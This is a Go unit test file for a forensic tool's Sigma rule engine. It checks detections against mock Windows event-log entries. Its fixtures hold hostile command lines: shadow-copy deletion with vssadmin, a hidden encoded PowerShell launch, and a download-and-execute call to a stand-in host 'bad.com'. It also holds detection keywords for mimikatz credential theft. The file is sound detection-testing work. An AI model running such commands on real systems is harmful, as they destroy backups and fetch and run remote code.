package test

import (
	"testing"

	"github.com/user/vhd-opener/internal/sigma"
	"github.com/user/vhd-opener/internal/timeline"
)

func TestSigmaEngineAlerts(t *testing.T) {
	engine := sigma.NewEngine()
	engine.AddEmbeddedDefaults()

	shadowCopyRule := `
title: Volume Shadow Copy Deletion (Ransomware Activity)
id: 52125f72-1234-4567-89ab-cdef12345678
status: stable
description: Detects attempts to clear volume shadow copies via vssadmin or wmic
level: critical
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - 'vssadmin'
        - 'delete shadows'
        - 'resize shadowstorage'
    condition: selection
tags:
    - attack.impact
    - attack.t1490
`
	rule, err := sigma.ParseRule([]byte(shadowCopyRule))
	if err != nil {
		t.Fatalf("Failed to parse embedded shadow copy rule: %v", err)
	}
	engine.Rules = append(engine.Rules, rule)

	mockTimeline := []timeline.TimelineEntry{
		{
			Source:      timeline.SourceEVTX,
			Title:       "Process Creation",
			EventType:   timeline.EventProcessCreated,
			Path:        "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx",
			Description: "Process Creation: C:\\Windows\\System32\\svchost.exe -k netsvcs -p",
		},
		{
			Source:      timeline.SourceEVTX,
			Title:       "Script Block Executed",
			EventType:   timeline.EventProcessCreated,
			Path:        "C:\\Windows\\System32\\winevt\\Logs\\PowerShell.evtx",
			Description: "powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdA...",
		},
		{
			Source:      timeline.SourceEVTX,
			Title:       "Process Creation",
			EventType:   timeline.EventProcessCreated,
			Path:        "C:\\Windows\\System32\\winevt\\Logs\\System.evtx",
			Description: "Process Creation: vssadmin.exe delete shadows /all /quiet",
		},
		{
			Source:      timeline.SourceMFT,
			Title:       "File Created",
			EventType:   timeline.EventFileCreated,
			Path:        "C:\\$MFT",
			Description: "File Created: C:\\Users\\Public\\ransom_note.txt",
		},
	}

	alerts := engine.ScanTimeline(mockTimeline)

	if len(alerts) < 2 {
		t.Errorf("Expected at least 2 alerts (PowerShell + VSSAdmin), got %d", len(alerts))
	}

	found := make(map[string]bool)
	for _, alert := range alerts {
		found[alert.RuleTitle] = true
	}

	if !found["Suspicious PowerShell Encoded Command"] {
		t.Error("Expected PowerShell encoded command alert")
	}
	if !found["Volume Shadow Copy Deletion"] && !found["Volume Shadow Copy Deletion (Ransomware Activity)"] {
		t.Error("Expected Volume Shadow Copy Deletion alert")
	}
}

func TestComplexSigmaConditionLogic(t *testing.T) {
	complexRuleYAML := `
title: Suspicious Execution with Exclusions
id: 99999999-aaaa-bbbb-cccc-1234567890ab
status: test
description: Tests complex nested AND, OR, NOT logic
level: high
logsource:
    category: process_creation
    product: windows
detection:
    selection_cmd:
        - 'cmd.exe /c'
        - 'powershell.exe'
    selection_suspicious:
        - 'downloadstring'
        - 'invoke-expression'
    filter_legit_admin:
        - 'admin_maintenance.ps1'
    condition: selection_cmd and selection_suspicious and not filter_legit_admin
tags:
    - attack.execution
`

	rule, err := sigma.ParseRule([]byte(complexRuleYAML))
	if err != nil {
		t.Fatalf("Failed to parse complex test rule: %v", err)
	}

	tests := []struct {
		name          string
		logText       string
		shouldTrigger bool
	}{
		{
			name:          "Trigger on malicious PowerShell execution",
			logText:       "powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://bad.com')",
			shouldTrigger: true,
		},
		{
			name:          "Trigger on cmd with suspicious payload",
			logText:       "cmd.exe /c powershell -c invoke-expression",
			shouldTrigger: true,
		},
		{
			name:          "Filtered out by legit admin script exclusion",
			logText:       "powershell.exe -file admin_maintenance.ps1 downloadstring",
			shouldTrigger: false,
		},
		{
			name:          "Benign command with no suspicious keywords",
			logText:       "C:\\Windows\\System32\\notepad.exe C:\\notes.txt",
			shouldTrigger: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := rule.Evaluate(tt.logText)
			if result != tt.shouldTrigger {
				t.Errorf("Rule evaluation mismatch for '%s'. Expected=%v, Got=%v", tt.name, tt.shouldTrigger, result)
			}
		})
	}
}

func TestSigmaRuleParsing(t *testing.T) {
	yamlData := `
title: Test Rule
id: test-1234
status: experimental
description: A test rule for unit testing
level: medium
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - 'mimikatz'
        - 'sekurlsa'
    condition: selection
tags:
    - attack.credential_access
    - attack.t1003
`
	rule, err := sigma.ParseRule([]byte(yamlData))
	if err != nil {
		t.Fatalf("Failed to parse rule: %v", err)
	}

	if rule.Title != "Test Rule" {
		t.Errorf("Expected title 'Test Rule', got '%s'", rule.Title)
	}
	if rule.ID != "test-1234" {
		t.Errorf("Expected ID 'test-1234', got '%s'", rule.ID)
	}
	if rule.Level != "medium" {
		t.Errorf("Expected level 'medium', got '%s'", rule.Level)
	}
	if len(rule.Tags) != 2 {
		t.Errorf("Expected 2 tags, got %d", len(rule.Tags))
	}

	if !rule.Evaluate("Found mimikatz in memory") {
		t.Error("Expected rule to match 'mimikatz'")
	}
	if rule.Evaluate("Normal system process") {
		t.Error("Expected rule NOT to match 'Normal system process'")
	}
}
